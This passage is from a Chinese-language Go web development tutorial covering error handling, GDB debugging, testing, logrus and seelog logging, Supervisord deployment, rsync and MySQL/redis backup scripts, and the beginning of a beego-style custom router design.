error 是一个内置的接口类型，我们可以在 /builtin/ 包下面找到相应的定义。而我们在很多内部包里面用到的 error 是 errors 包下面的实现的私有结构 errorString

```go
// errorString is a trivial implementation of error.
type errorString struct {
    s string
}

func (e *errorString) Error() string {
    return e.s
}

// New returns an error that formats as the given text.
func New(text string) error {
    return &errorString{text}
}
```
#### 自定义 Error
通过上面的介绍我们知道 error 是一个 interface，所以在实现自己的包的时候，通过定义实现此接口的结构，我们就可以实现自己的错误定义，请看来自 Json 包的示例：

```go
type SyntaxError struct {
    msg    string // 错误描述
    Offset int64  // 错误发生的位置
}

func (e *SyntaxError) Error() string { return e.msg }
```
Offset 字段在调用 Error 的时候不会被打印，但是我们可以通过类型断言获取错误类型，然后可以打印相应的错误信息，请看下面的例子:

```go
if err := dec.Decode(&val); err != nil {
    if serr, ok := err.(*json.SyntaxError); ok {
        line, col := findLine(f, serr.Offset)
        return fmt.Errorf("%s:%d:%d: %v", f.Name(), line, col, err)
    }
    
    return err
}
```
需要注意的是，函数返回自定义错误时，返回值推荐设置为 error 类型，而非自定义错误类型，特别需要注意的是不应预声明自定义错误类型的变量。例如：

```go
func Decode() *SyntaxError { // 错误，将可能导致上层调用者 err!=nil 的判断永远为 true。
        var err *SyntaxError     // 预声明错误变量
        if 出错条件 {
            err = &SyntaxError{}
        }
        return err               // 错误，err 永远等于非 nil，导致上层调用者 err!=nil 的判断始终为 true
    }
```    
原因见 golang.org/doc/faq#nil_error

上面例子简单的演示了如何自定义 Error 类型。但是如果我们还需要更复杂的错误处理呢？此时，我们来参考一下 net 包采用的方法：

```go
package net

type Error interface {
    error
    Timeout() bool   // Is the error a timeout?
    Temporary() bool // Is the error temporary?
}
```
在调用的地方，通过类型断言 err 是不是 net.Error, 来细化错误的处理，例如下面的例子，如果一个网络发生临时性错误，那么将会 sleep 1 秒之后重试：

```go
if nerr, ok := err.(net.Error); ok && nerr.Temporary() {
    time.Sleep(1e9)
    continue
}
if err != nil {
    log.Fatal(err)
}
```
#### 错误处理
Go 在错误处理上采用了与 C 类似的检查返回值的方式，而不是其他多数主流语言采用的异常方式，这造成了代码编写上的一个很大的缺点：错误处理代码的冗余，对于这种情况是我们通过复用检测函数来减少类似的代码。



```go
func init() {
    http.HandleFunc("/view", viewRecord)
}

func viewRecord(w http.ResponseWriter, r *http.Request) {
    c := appengine.NewContext(r)
    key := datastore.NewKey(c, "Record", r.FormValue("id"), 0, nil)
    record := new(Record)
    if err := datastore.Get(c, key, record); err != nil {
        http.Error(w, err.Error(), 500)
        return
    }
    if err := viewTemplate.Execute(w, record); err != nil {
        http.Error(w, err.Error(), 500)
    }
}
```
上面的例子中获取数据和模板展示调用时都有检测错误，当有错误发生时，调用了统一的处理函数 http.Error，返回给客户端 500 错误码，并显示相应的错误数据。但是当越来越多的 HandleFunc 加入之后，这样的错误处理逻辑代码就会越来越多，其实我们可以通过自定义路由器来缩减代码 (实现的思路可以参考第三章的 HTTP 详解)。
```go

type appHandler func(http.ResponseWriter, *http.Request) error

func (fn appHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    if err := fn(w, r); err != nil {
        http.Error(w, err.Error(), 500)
    }
}
```
上面我们定义了自定义的路由器，然后我们可以通过如下方式来注册函数：

```go
func init() {
    http.Handle("/view", appHandler(viewRecord))
}
```
当请求 /view 的时候我们的逻辑处理可以变成如下代码，和第一种实现方式相比较已经简单了很多。

```go
func viewRecord(w http.ResponseWriter, r *http.Request) error {
    c := appengine.NewContext(r)
    key := datastore.NewKey(c, "Record", r.FormValue("id"), 0, nil)
    record := new(Record)
    if err := datastore.Get(c, key, record); err != nil {
        return err
    }
    return viewTemplate.Execute(w, record)
}
```
上面的例子错误处理的时候所有的错误返回给用户的都是 500 错误码，然后打印出来相应的错误代码，其实我们可以把这个错误信息定义的更加友好，调试的时候也方便定位问题，我们可以自定义返回的错误类型：

```go
type appError struct {
    Error   error
    Message string
    Code    int
}
```
这样我们的自定义路由器可以改成如下方式：
```go

type appHandler func(http.ResponseWriter, *http.Request) *appError

func (fn appHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    if e := fn(w, r); e != nil { // e is *appError, not os.Error.
        c := appengine.NewContext(r)
        c.Errorf("%v", e.Error)
        http.Error(w, e.Message, e.Code)
    }
}
```
这样修改完自定义错误之后，我们的逻辑处理可以改成如下方式：

```go
func viewRecord(w http.ResponseWriter, r *http.Request) *appError {
    c := appengine.NewContext(r)
    key := datastore.NewKey(c, "Record", r.FormValue("id"), 0, nil)
    record := new(Record)
    if err := datastore.Get(c, key, record); err != nil {
        return &appError{err, "Record not found", 404}
    }
    if err := viewTemplate.Execute(w, record); err != nil {
        return &appError{err, "Can't display record", 500}
    }
    return nil
}
```
如上所示，在我们访问 view 的时候可以根据不同的情况获取不同的错误码和错误信息，虽然这个和第一个版本的代码量差不多，但是这个显示的错误更加明显，提示的错误信息更加友好，扩展性也比第一个更好。

### 使用 GDB 调试
另外建议纯 go 代码使用 delve 可以很好的进行 Go 代码调试

####  GDB 调试简介
使用 GDB 可以做如下事情：
1. 启动程序，可以按照开发者的自定义要求运行程序。
2. 可让被调试的程序在开发者设定的调置的断点处停住。（断点可以是条件表达式）
3. 当程序被停住时，可以检查此时程序中所发生的事。
4. 动态的改变当前程序的执行环境。

编译 Go 程序的时候需要注意以下几点

1. 传递参数 -ldflags "-s"，忽略 debug 的打印信息
2. 传递 -gcflags "-N -l" 参数，这样可以忽略 Go 内部做的一些优化，聚合变量和函数等优化，这样对于 GDB 调试来说非常困难，所以在编译的时候加入这两个参数避免这些优化。
常用命令
#### GDB 的一些常用命令如下所示

- **list**

简写命令 l，用来显示源代码，默认显示十行代码，后面可以带上参数显示的具体行
简写命令 b, 用来设置断点，后面跟上参数设置断点的行数，例如 b 10 在第十行设置断点。
- **break**
简写命令 b, 用来设置断点，后面跟上参数设置断点的行数，例如 b 10 在第十行设置断点。
- **delete**
简写命令 d, 用来删除断点，后面跟上断点设置的序号，这个序号可以通过 info breakpoints 获取相应的设置的断点序号，如下是显示的设置断点序号。

- **backtrace**

简写命令 bt, 用来打印执行的代码过程，如下所示：

- **info** 命令用来显示信息，后面有几种参数，我们常用的有如下几种：

  - info locals

    显示当前执行的程序中的变量值

  - info breakpoints

    显示当前设置的断点列表
 
   - info goroutines

   显示当前执行的 goroutine 列表，如下代码所示，带 * 的表示当前执行的


- **print**

简写命令 p，用来打印变量或者其他信息，后面跟上需要打印的变量名，当然还有一些很有用的函数 $len () 和 $cap ()，用来返回当前 string、slices 或者 maps 的长度和容量。

- **whatis**

用来显示当前变量的类型，后面跟上变量名，例如 whatis msg, 显示如下：


- **next**

简写命令 n, 用来单步调试，跳到下一步，当有断点之后，可以输入 n 跳转到下一步继续执行

- **continue**

简称命令 c，用来跳出当前断点处，后面可以跟参数 N，跳过多少次断点

- **set variable**

该命令用来改变运行过程中的变量值，格式如：set variable <var>=<value>
### 测试
gotest_test.go: 这是我们的单元测试文件，但是记住下面的这些原则：

文件名必须是 _test.go 结尾的，这样在执行 go test 的时候才会执行到相应的代码
你必须 import testing 这个包
所有的测试用例函数必须是 Test 开头
测试用例会按照源代码中写的顺序依次执行
测试函数 TestXxx() 的参数是 testing.T，我们可以使用该类型来记录错误或者是测试状态
测试格式：func TestXxx (t *testing.T), Xxx 部分可以为任意的字母数字的组合，但是首字母不能是小写字母 [a-z]，例如 Testintdiv 是错误的函数名。
函数中通过调用 testing.T 的 Error, Errorf, FailNow, Fatal, FatalIf 方法，说明测试不通过，调用 Log 方法用来记录测试的信息。

## 部署与维护
###  应用日志
#### logrus介绍

logrus 是用 Go 语言实现的一个日志系统，与标准库 log 完全兼容并且核心 API 很稳定，是 Go 语言目前最活跃的日志库
基于 logrus 的自定义日志处理
```go
package main

import (
    "os"

    log "github.com/Sirupsen/logrus"
)

func init() {
    // 日志格式化为 JSON 而不是默认的 ASCII
    log.SetFormatter(&log.JSONFormatter{})

    // 输出 stdout 而不是默认的 stderr，也可以是一个文件
    log.SetOutput(os.Stdout)

    // 只记录严重或以上警告
    log.SetLevel(log.WarnLevel)
}

func main() {
    log.WithFields(log.Fields{
        "animal": "walrus",
        "size":   10,
    }).Info("A group of walrus emerges from the ocean")

    log.WithFields(log.Fields{
        "omg":    true,
        "number": 122,
    }).Warn("The group's number increased tremendously!")

    log.WithFields(log.Fields{
        "omg":    true,
        "number": 100,
    }).Fatal("The ice breaks!")

    // 通过日志语句重用字段
    // logrus.Entry 返回自 WithFields()
    contextLogger := log.WithFields(log.Fields{
        "common": "this is a common field",
        "other":  "I also should be logged always",
    })

    contextLogger.Info("I'll be logged with common and other field")
    contextLogger.Info("Me too")
}
```
#### seelog 介绍
seelog 是用 Go 语言实现的一个日志系统，它提供了一些简单的函数来实现复杂的日志分配、过滤和格式化。主要有如下特性：

- XML 的动态配置，可以不用重新编译程序而动态的加载配置信息
- 支持热更新，能够动态改变配置而不需要重启应用
- 支持多输出流，能够同时把日志输出到多种流中、例如文件流、网络流等
- 支持不同的日志输出

  - 命令行输出
  - 文件输出
  - 缓存输出
  - 支持 log rotate
  - SMTP 邮件
```go
package main

import log "github.com/cihub/seelog"

func main() {
    defer log.Flush()
    log.Info("Hello from Seelog!")
}
```
编译后运行如果出现了 Hello from seelog，说明 seelog 日志系统已经成功安装并且可以正常运行了。

基于 seelog 的自定义日志处理
seelog 支持自定义日志处理，下面是我基于它自定义的日志处理包的部分内容：

```go
package logs

import (
    // "errors"
    "fmt"
    // "io"

    seelog "github.com/cihub/seelog"
)

var Logger seelog.LoggerInterface

func loadAppConfig() {
    appConfig := `
<seelog minlevel="warn">
    <outputs formatid="common">
        <rollingfile type="size" filename="/data/logs/roll.log" maxsize="100000" maxrolls="5"/>
        <filter levels="critical">
            <file path="/data/logs/critical.log" formatid="critical"/>
            <smtp formatid="criticalemail" senderaddress="astaxie@gmail.com" sendername="ShortUrl API" hostname="smtp.gmail.com" hostport="587" username="mailusername" password="mailpassword">
                <recipient address="xiemengjun@gmail.com"/>
            </smtp>
        </filter>
    </outputs>
    <formats>
        <format id="common" format="%Date/%Time [%LEV] %Msg%n" />
        <format id="critical" format="%File %FullPath %Func %Msg%n" />
        <format id="criticalemail" format="Critical error on our server!\n    %Time %Date %RelFile %Func %Msg \nSent by Seelog"/>
    </formats>
</seelog>
`
    logger, err := seelog.LoggerFromConfigAsBytes([]byte(appConfig))
    if err != nil {
        fmt.Println(err)
        return
    }
    UseLogger(logger)
}

func init() {
    DisableLog()
    loadAppConfig()
}

// DisableLog disables all library log output
func DisableLog() {
    Logger = seelog.Disabled
}

// UseLogger uses a specified seelog.LoggerInterface to output library log.
// Use this func if you are using Seelog logging system in your app.
func UseLogger(newLogger seelog.LoggerInterface) {
    Logger = newLogger
}
```
上面主要实现了三个函数，

- **DisableLog**

初始化全局变量 Logger 为 seelog 的禁用状态，主要为了防止 Logger 被多次初始化

- **loadAppConfig**

根据配置文件初始化 seelog 的配置信息，这里我们把配置文件通过字符串读取设置好了，当然也可以通过读取 XML 文件。里面的配置说明如下：

  - seelog

   minlevel 参数可选，如果被配置，高于或等于此级别的日志会被记录，同理 maxlevel。

  - outputs

   输出信息的目的地，这里分成了两份数据，一份记录到 log rotate 文件里面。另一份设置了 filter，如果这个错误级别是 critical，那么将发送报警邮件。

  - formats

   定义了各种日志的格式

  - UseLogger

  设置当前的日志器为相应的日志处理

上面我们定义了一个自定义的日志处理包，下面就是使用示例：

```go
package main

import (
    "net/http"
    "project/logs"
    "project/configs"
    "project/routes"
)

func main() {
    addr, _ := configs.MainConfig.String("server", "addr")
    logs.Logger.Info("Start server at:%v", addr)
    err := http.ListenAndServe(addr, routes.NewMux())
    logs.Logger.Critical("Server err:%v", err)
}
```
发生错误发送邮件
上面的例子解释了如何设置发送邮件，我们通过如下的 smtp 配置用来发送邮件：

```xml
<smtp formatid="criticalemail" senderaddress="astaxie@gmail.com" sendername="ShortUrl API" hostname="smtp.gmail.com" hostport="587" username="mailusername" password="mailpassword">
    <recipient address="xiemengjun@gmail.com"/>
</smtp>
```
邮件的格式通过 criticalemail 配置，然后通过其他的配置发送邮件服务器的配置，通过 recipient 配置接收邮件的用户，如果有多个用户可以再添加一行。
logs.Logger.Critical("test Critical message")
现在，只要我们的应用在线上记录一个 Critical 的信息，你的邮箱就会收到一个 Email，这样一旦线上的系统出现问题，你就能立马通过邮件获知，就能及时的进行处理。

### 应用部署
#### daemon
目前 Go 程序还不能实现 daemon，详细的见这个 Go 语言的 bug：<http://code.google.com/p/go/issues/detail?id=227>，大概的意思说很难从现有的使用的线程中 fork 一个出来，因为没有一种简单的方法来确保所有已经使用的线程的状态一致性问题。

- 但是我们可以看到很多网上的一些实现 daemon 的方法，例如下面两种方式：

MarGo 的一个实现思路，使用 Command 来执行自身的应用，如果真想实现，那么推荐这种方案
```go
d := flag.Bool("d", false, "Whether or not to launch in the background(like a daemon)")
if *d {
    cmd := exec.Command(os.Args[0],
        "-close-fds",
        "-addr", *addr,
        "-call", *call,
    )
    serr, err := cmd.StderrPipe()
    if err != nil {
        log.Fatalln(err)
    }
    err = cmd.Start()
    if err != nil {
        log.Fatalln(err)
    }
    s, err := ioutil.ReadAll(serr)
    s = bytes.TrimSpace(s)
    if bytes.HasPrefix(s, []byte("addr: ")) {
        fmt.Println(string(s))
        cmd.Process.Release()
    } else {
        log.Printf("unexpected response from MarGo: `%s` error: `%v`\n", s, err)
        cmd.Process.Kill()
    }
}
```
另一种是利用 syscall 的方案，但是这个方案并不完善：
```go
package main

import (
    "log"
    "os"
    "syscall"
)

func daemon(nochdir, noclose int) int {
    var ret, ret2 uintptr
    var err uintptr
    darwin := syscall.OS == "darwin"

    // already a daemon
    if syscall.Getppid() == 1 {
        return 0
    }

    // fork off the parent process
    ret, ret2, err = syscall.RawSyscall(syscall.SYS_FORK, 0, 0, 0)
    if err != 0 {
        return -1
    }

    // failure
    if ret2 < 0 {
        os.Exit(-1)
    }

    // handle exception for darwin
    if darwin && ret2 == 1 {
        ret = 0
    }

    // if we got a good PID, then we call exit the parent process.
    if ret > 0 {
        os.Exit(0)
    }

    /* Change the file mode mask */
    _ = syscall.Umask(0)

    // create a new SID for the child process
    s_ret, s_errno := syscall.Setsid()
    if s_errno != 0 {
        log.Printf("Error: syscall.Setsid errno: %d", s_errno)
    }
    if s_ret < 0 {
        return -1
    }

    if nochdir == 0 {
        os.Chdir("/")
    }

    if noclose == 0 {
        f, e := os.OpenFile("/dev/null", os.O_RDWR, 0)
        if e == nil {
            fd := f.Fd()
            syscall.Dup2(fd, os.Stdin.Fd())
            syscall.Dup2(fd, os.Stdout.Fd())
            syscall.Dup2(fd, os.Stderr.Fd())
        }
    }

    return 0
}   
```


#### Supervisord
Supervisord 是用 Python 实现的一款非常实用的进程管理工具。supervisord 会帮你把管理的应用程序转成 daemon 程序，而且可以方便的通过命令开启、关闭、重启等操作，而且它管理的进程一旦崩溃会自动重启，这样就可以保证程序执行中断后的情况下有自我修复的功能。

我前面在应用中踩过一个坑，就是因为所有的应用程序都是由 Supervisord 父进程生出来的，那么当你修改了操作系统的文件描述符之后，别忘记重启 Supervisord，光重启下面的应用程序没用。当初我就是系统安装好之后就先装了 Supervisord，然后开始部署程序，修改文件描述符，重启程序，以为文件描述符已经是 100000 了，其实 Supervisord 这个时候还是默认的 1024 个，导致他管理的进程所有的描述符也是 1024. 开放之后压力一上来系统就开始报文件描述符用光了，查了很久才找到这个坑。

##### Supervisord 安装
打开 http://pypi.python.org/pypi/setuptools#files，根据你系统的 python 的版本下载相应的文件，然后执行 sh setuptoolsxxxx.egg，这样就可以使用 easy_install 命令来安装 Supervisord。

Supervisord 配置
Supervisord 默认的配置文件路径为 /etc/supervisord.conf，通过文本编辑器修改这个文件，下面是一个示例的配置文件：

```conf
;/etc/supervisord.conf
[unix_http_server]
file = /var/run/supervisord.sock
chmod = 0777
chown= root:root

[inet_http_server]
# Web管理界面设定
port=9001
username = admin
password = yourpassword

[supervisorctl]
; 必须和'unix_http_server'里面的设定匹配
serverurl = unix:///var/run/supervisord.sock

[supervisord]
logfile=/var/log/supervisord/supervisord.log ; (main log file;default $CWD/supervisord.log)
logfile_maxbytes=50MB       ; (max main logfile bytes b4 rotation;default 50MB)
logfile_backups=10          ; (num of main logfile rotation backups;default 10)
loglevel=info               ; (log level;default info; others: debug,warn,trace)
pidfile=/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid)
nodaemon=true              ; (start in foreground if true;default false)
minfds=1024                 ; (min. avail startup file descriptors;default 1024)
minprocs=200                ; (min. avail process descriptors;default 200)
user=root                 ; (default is current user, required if root)
childlogdir=/var/log/supervisord/            ; ('AUTO' child log dir, default $TEMP)

[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface

; 管理的单个进程的配置，可以添加多个 program
[program:blogdemon]
command=/data/blog/blogdemon
autostart = true
startsecs = 5
user = root
redirect_stderr = true
stdout_logfile = /var/log/supervisord/blogdemon.log
```
##### Supervisord 管理
Supervisord 安装完成后有两个可用的命令行 supervisor 和 supervisorctl，命令使用解释如下：

  - supervisord，初始启动 Supervisord，启动、管理配置中设置的进程。
  - supervisorctl stop programxxx，停止某一个进程 (programxxx)，programxxx 为 [program:blogdemon] 里配置的值，这个示例就是 blogdemon。
  - supervisorctl start programxxx，启动某个进程
  - supervisorctl restart programxxx，重启某个进程
  - supervisorctl stop all，停止全部进程，注：start、restart、stop 都不会载入最新的配置文件。
  - supervisorctl reload，载入最新的配置文件，并按新的配置启动、管理所有进程。
### 备份和恢复
#### rsync 安装


软件包安装
```cmd
# sudo apt-get  install  rsync  注：在debian、ubuntu 等在线安装方法；
# yum install rsync    注：Fedora、Redhat、CentOS 等在线安装方法；
# rpm -ivh rsync       注：Fedora、Redhat、CentOS 等rpm包安装方法；
其它 Linux 发行版，请用相应的软件包管理方法来安装。源码包安装

tar xvf  rsync-xxx.tar.gz
cd rsync-xxx
./configure --prefix=/usr  ;make ;make install   注：在用源码包编译安装之前，您得安装 gcc 等编译工具才行；
```
#### rsync 配置
rsync 主要有以下三个配置文件 rsyncd.conf (主配置文件)、rsyncd.secrets (密码文件)、rsyncd.motd (rysnc 服务器信息)。

关于这几个文件的配置大家可以参考官方网站或者其他介绍 rsync 的网站，下面介绍服务器端和客户端如何开启

- 服务端开启：

#/usr/bin/rsync --daemon  --config=/etc/rsyncd.conf
--daemon 参数方式，是让 rsync 以服务器模式运行。
- 把 rsync 加入开机启动

echo 'rsync --daemon' >> /etc/rc.d/rc.local
- 设置 rsync 密码

echo '你的用户名:你的密码' > /etc/rsyncd.secrets
chmod 600 /etc/rsyncd.secrets
- 客户端同步：

客户端可以通过如下命令同步服务器上的文件：

rsync -avzP  --delete  --password-file=rsyncd.secrets   用户名@192.168.145.5::www /var/rsync/backup

这条命令，简要的说明一下几个要点：

   1. -avzP 是啥，读者可以使用 --help 查看
   2. --delete 是为了比如 A 上删除了一个文件，同步的时候，B 会自动删除相对应的文件
   3. --password-file 客户端中 /etc/rsyncd.secrets 设置的密码，要和服务端的 /etc/rsyncd.secrets 中的密码一样，这样 cron 运行的时候，就不需要密码了
   4. 这条命令中的 "用户名" 为服务端的 /etc/rsyncd.secrets 中的用户名
   5. 这条命令中的 192.168.145.5 为服务端的 IP 地址
   6. ::www，注意是 2 个：号，www 为服务端的配置文件 /etc/rsyncd.conf 中 的 [www]，意思是根据服务端上的 /etc/rsyncd.conf 来同步其中的 [www] 段内容，一个：号的时候，用于不根据配置文件，直接同步指定目录。
为了让同步实时性，可以设置 crontab，保持 rsync 每分钟同步，当然用户也可以根据文件的重要程度设置不同的同步频率。

#### MySQL 备份
应用数据库目前还是 MySQL 为主流，目前 MySQL 的备份有两种方式：热备份和冷备份，热备份目前主要是采用 master/slave 方式（master/slave 方式的同步目前主要用于数据库读写分离，也可以用于热备份数据），关于如何配置这方面的资料，大家可以找到很多。冷备份的话就是数据有一定的延迟，但是可以保证该时间段之前的数据完整，例如有些时候可能我们的误操作引起了数据的丢失，那么 master/slave 模式是无法找回丢失数据的，但是通过冷备份可以部分恢复数据。

冷备份一般使用 shell 脚本来实现定时备份数据库，然后通过上面介绍 rsync 同步非本地机房的一台服务器。

下面这个是定时备份 mysql 的备份脚本，我们使用了 mysqldump 程序，这个命令可以把数据库导出到一个文件中。
```lua
#!/bin/bash

# 以下配置信息请自己修改
mysql_user="USER" # MySQL备份用户
mysql_password="PASSWORD" # MySQL备份用户的密码
mysql_host="localhost"
mysql_port="3306"
mysql_charset="utf8" #MySQL编码
backup_db_arr=("db1" "db2") # 要备份的数据库名称，多个用空格分开隔开 如("db1" "db2" "db3")
backup_location=/var/www/mysql  #备 份数据存放位置，末尾请不要带"/", 此项可以保持默认，程序会自动创建文件夹
expire_backup_delete="ON" # 是否开启过期备份删除 ON为开启 OFF为关闭
expire_days=3 # 过期时间天数 默认为三天，此项只有在 expire_backup_delete 开启时有效

# 本行开始以下不需要修改
backup_time=`date +%Y%m%d%H%M`  # 定义备份详细时间
backup_Ymd=`date +%Y-%m-%d` # 定义备份目录中的年月日时间
backup_3ago=`date -d '3 days ago' +%Y-%m-%d` # 3 天之前的日期
backup_dir=$backup_location/$backup_Ymd  # 备份文件夹全路径
welcome_msg="Welcome to use MySQL backup tools!" # 欢迎语

# 判断 MYSQL 是否启动, mysql 没有启动则备份退出
mysql_ps=`ps -ef |grep mysql |wc -l`
mysql_listen=`netstat -an |grep LISTEN |grep $mysql_port|wc -l`
if [ [$mysql_ps == 0] -o [$mysql_listen == 0] ]; then
        echo "ERROR:MySQL is not running! backup stop!"
        exit
else
        echo $welcome_msg
fi

# 连接到 mysql 数据库，无法连接则备份退出
mysql -h$mysql_host -P$mysql_port -u$mysql_user -p$mysql_password <<end
use mysql;
select host,user from user where user='root' and host='localhost';
exit
end

flag=`echo $?`
if [ $flag != "0" ]; then
        echo "ERROR:Can't connect mysql server! backup stop!"
        exit
else
        echo "MySQL connect ok! Please wait......"
        # 判断有没有定义备份的数据库，如果定义则开始备份，否则退出备份
        if [ "$backup_db_arr" != "" ];then
                #dbnames=$(cut -d ',' -f1-5 $backup_database)
                #echo "arr is (${backup_db_arr[@]})"
                for dbname in ${backup_db_arr[@]}
                do
                        echo "database $dbname backup start..."
                        `mkdir -p $backup_dir`
                        `mysqldump -h$mysql_host -P$mysql_port -u$mysql_user -p$mysql_password $dbname --default-character-set=$mysql_charset | gzip > $backup_dir/$dbname-$backup_time.sql.gz`
                        flag=`echo $?`
                        if [ $flag == "0" ];then
                                echo "database $dbname success backup to $backup_dir/$dbname-$backup_time.sql.gz"
                        else
                                echo "database $dbname backup fail!"
                        fi

                done
        else
                echo "ERROR:No database to backup! backup stop"
                exit
        fi
        # 如果开启了删除过期备份，则进行删除操作
        if [ "$expire_backup_delete" == "ON" -a  "$backup_location" != "" ];then
                 #`find $backup_location/ -type d -o -type f -ctime +$expire_days -exec rm -rf {} \;`
                 `find $backup_location/ -type d -mtime +$expire_days | xargs rm -rf`
                 echo "Expired backup data delete complete!"
        fi
        echo "All database backup success! Thank you!"
        exit
fi
```
修改 shell 脚本的属性：

chmod 600 /root/mysql_backup.sh
chmod +x /root/mysql_backup.sh
设置好属性之后，把命令加入 crontab，我们设置了每天 00:00 定时自动备份，然后把备份的脚本目录 /var/www/mysql 设置为 rsync 同步目录。

00 00 * * * /root/mysql_backup.sh
#### MySQL 恢复
前面介绍 MySQL 备份分为热备份和冷备份，热备份主要的目的是为了能够实时的恢复，例如应用服务器出现了硬盘故障，那么我们可以通过修改配置文件把数据库的读取和写入改成 slave，这样就可以尽量少时间的中断服务。

但是有时候我们需要通过冷备份的 SQL 来进行数据恢复，既然有了数据库的备份，就可以通过命令导入：

mysql -u username -p databse < backup.sql
可以看到，导出和导入数据库数据都是相当简单，不过如果还需要管理权限，或者其他的一些字符集的设置的话，可能会稍微复杂一些，但是这些都是可以通过一些命令来完成的。

#### redis 备份
redis 是目前我们使用最多的 NoSQL，它的备份也分为两种：热备份和冷备份，redis 也支持 master/slave 模式，所以我们的热备份可以通过这种方式实现，相应的配置大家可以参考官方的文档配置，相当的简单。我们这里介绍冷备份的方式：redis 其实会定时的把内存里面的缓存数据保存到数据库文件里面，我们备份只要备份相应的文件就可以，就是利用前面介绍的 rsync 备份到非本地机房就可以实现。

#### redis 恢复
redis 的恢复分为热备份恢复和冷备份恢复，热备份恢复的目的和方法同 MySQL 的恢复一样，只要修改应用的相应的数据库连接即可。

但是有时候我们需要根据冷备份来恢复数据，redis 的冷备份恢复其实就是只要把保存的数据库文件 copy 到 redis 的工作目录，然后启动 redis 就可以了，redis 在启动的时候会自动加载数据库文件到内存中，启动的速度根据数据库的文件大小来决定。

## 如何设计一个 Web 框架
### 项目规划
- 模型 (Model) 代表数据结构。通常来说，模型类将包含取出、插入、更新数据库资料等这些功能。
- 视图 (View) 是展示给用户的信息的结构及样式。一个视图通常是一个网页，但是在 Go 中，一个视图也可以是一个页面片段，如页头、页尾。它还可以是一个 RSS 页面，或其它类型的 “页面”，Go 实现的 template 包已经很好的实现了 View 层中的部分功能。
- 控制器 (Controller) 是模型、视图以及其他任何处理 HTTP 请求所必须的资源之间的中介，并生成网页。
<img src="img\13.1.flow.png">

1. main.go 作为应用入口，初始化一些运行博客所需要的基本资源，配置信息，监听端口。
2. 路由功能检查 HTTP 请求，根据 URL 以及 method 来确定谁 (控制层) 来处理请求的转发资源。
3. 如果缓存文件存在，它将绕过通常的流程执行，被直接发送给浏览器。
4. 安全检测：应用程序控制器调用之前，HTTP 请求和任一用户提交的数据将被过滤。
5. 控制器装载模型、核心库、辅助函数，以及任何处理特定请求所需的其它资源，控制器主要负责处理业务逻辑。
6. 输出视图层中渲染好的即将发送到 Web 浏览器中的内容。如果开启缓存，视图首先被缓存，将用于以后的常规请求。
#### 目录结构
根据上面的应用程序流程设计，博客的目录结构设计如下：

|——main.go         入口文件
|——conf            配置文件和处理模块
|——controllers     控制器入口
|——models          数据库处理模块
|——utils           辅助函数库
|——static          静态文件目录
|——views           视图库
### 自定义路由器设计
HTTP 路由组件负责将 HTTP 请求交到对应的函数处理 (
#### 默认的路由实现
```go
func fooHandler(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "Hello, %q", html.EscapeString(r.URL.Path))
}

http.HandleFunc("/foo", fooHandler)

http.HandleFunc("/bar", func(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "Hello, %q", html.EscapeString(r.URL.Path))
})

log.Fatal(http.ListenAndServe(":8080", nil))
```

上面的例子调用了 http 默认的 DefaultServeMux 来添加路由，需要提供两个参数，第一个参数是希望用户访问此资源的 URL 路径 (保存在 r.URL.Path)，第二参数是即将要执行的函数，以提供用户访问的资源。路由的思路主要集中在两点：
- 添加路由信息
- 根据用户请求转发到要执行的函数
Go 默认的路由添加是通过函数 http.Handle 和 http.HandleFunc 等来添加，底层都是调用了 DefaultServeMux.Handle(pattern string, handler Handler), 这个函数会把路由信息存储在一个 map 信息中 map[string]muxEntry，这就解决了上面说的第一点。

Go 监听端口，然后接收到 tcp 连接会扔给 Handler 来处理，上面的例子默认 nil 即为 http.DefaultServeMux，通过 DefaultServeMux.ServeHTTP 函数来进行调度，遍历之前存储的 map 路由信息，和用户访问的 URL 进行匹配，以查询对应注册的处理函数，这样就实现了上面所说的第二点。

```go
for k, v := range mux.m {
    if !pathMatch(k, path) {
        continue
    }
    if h == nil || len(k) > n {
        n = len(k)
        h = v.h
    }
}
```
#### beego 框架路由实现
目但是 Go 自带的路由器有几个限制：
- 不支持参数设定，例如 /user/:uid 这种泛类型匹配
- 无法很好的支持 REST 模式，无法限制访问的方法，例如上面的例子中，用户访问 /foo，可以用 GET、POST、DELETE、HEAD 等方式访问
- 一般网站的路由规则太多了，编写繁琐。

#### 存储路由
REST 的方法对应到 struct 的方法中去，然后路由到 truct 而不是函数，这样在转发路由的时候就可以根据 method 来执行不同的方法。

根据上面的思路，我们设计了两个数据类型 controllerInfo (保存路径和对应的 struct，这里是一个 reflect.Type 类型) 和 ControllerRegistor (routers 是一个 slice 用来保存用户添加的路由信息，以及 beego 框架的应用信息)

```go
type controllerInfo struct {
    //正则匹配器
    regex          *regexp.Regexp
    // 正则匹配规则的字符串
    params         map[int]string
    //类型反射器
    controllerType reflect.Type
}

type ControllerRegistor struct {
    //路由器
    routers     []*controllerInfo
    Application *App
}
```
ControllerRegistor 对外的接口函数有

```go
func (p *ControllerRegistor) Add(pattern string, c ControllerInterface)
```
详细的实现如下所示：

```go

func (p *ControllerRegistor) Add(pattern string, c ControllerInterface) {
    // 分割字符串方便
    parts := strings.Split(pattern, "/")

    j := 0
    params := make(map[int]string)
    for i, part := range parts {
        if strings.HasPrefix(part, ":") {
            expr := "([^/]+)"

            // a user may choose to override the defult expression
            // similar to expressjs: ‘/user/:id([0-9]+)’

            if index := strings.Index(part, "("); index != -1 {
                expr = part[index:]
                part = part[:index]
            }
            params[j] = part
            parts[i] = expr
            j++
        }
    }

    // recreate the url pattern, with parameters replaced
    // by regular expressions. then compile the regex

    pattern = strings.Join(parts, "/")
    regex, regexErr := regexp.Compile(pattern)
    if regexErr != nil {

        // TODO add error handling here to avoid panic
        panic(regexErr)
        return
    }

    // now create the Route
    t := reflect.Indirect(reflect.ValueOf(c)).Type()
    route := &controllerInfo{}
    route.regex = regex
    route.params = params
    route.controllerType = t

    p.routers = append(p.routers, route)

}
```
#### 静态路由实现
上面我们实现的动态路由的实现，Go 的 http 包默认支持静态文件处理 FileServer，由于我们实现了自定义的路由器，那么静态文件也需要自己设定，beego 的静态文件夹路径保存在全局变量 StaticDir 中，StaticDir 是一个 map 类型，实现如下：

```go
func (app *App) SetStaticPath(url string, path string) *App {
